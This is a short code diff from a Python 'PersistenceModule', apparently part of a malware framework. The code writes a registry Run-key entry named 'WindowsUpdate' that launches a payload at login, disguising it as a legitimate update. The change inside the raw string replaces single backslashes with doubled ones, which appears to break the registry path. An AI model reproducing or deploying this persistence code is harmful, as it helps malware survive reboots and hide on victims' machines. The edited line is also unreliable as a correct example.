@@ -91,7 +91,7 @@ class PersistenceModule(BaseModule):
             import winreg
             
             key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
             
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                 winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
